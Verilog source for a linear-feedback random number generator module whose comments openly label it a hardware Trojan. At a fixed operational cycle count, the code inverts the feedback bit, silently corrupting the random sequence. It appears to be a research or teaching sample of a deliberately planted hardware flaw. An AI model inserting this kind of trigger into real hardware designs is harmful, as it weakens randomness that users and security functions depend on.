module random_with_silent_malfunction (
    
    // Inputs
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_seed,

    // Outputs
    output reg          [7:0]  o_data
);

    /******** Reg declarations ********/
    reg [31:0]  r_data;
    wire        w_xnor;

    /******** Trojan specific declarations ********/
    // Operational condition trigger for the Trojan (could be based on time, input patterns, etc.)
    reg [31:0] operational_count = 0;  // Example: time-based trigger
    wire trojan_trigger = (operational_count == 32'hAAAA_AAAA); // Specific operational count

    /******** Concurrent logic ********/
    assign w_xnor = (r_data[31] ^ ~r_data[29] ^ ~r_data[25] ^ ~r_data[24]);

    /******** Process ********/
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            r_data <= i_seed;
            operational_count <= 0;  // Reset operational count on reset
        end else begin
            // Increase operational count every cycle
            operational_count <= operational_count + 1;
            
            // Normal RNG process, but starts malfunctioning when Trojan is triggered
            if (!trojan_trigger) begin
                r_data <= {r_data[30:0], w_xnor};
            end else begin
                // Silent malfunction: subtly alter RNG behavior to make it predictable or incorrect
                // Example: Inverting bits or sticking to a certain pattern
                r_data <= {r_data[30:0], ~w_xnor}; // Invert the last bit, altering the RNG sequence
            end
        end
        // Output the least significant 8 bits of the internal state as random data
        o_data <= r_data[7:0];
    end

endmodule
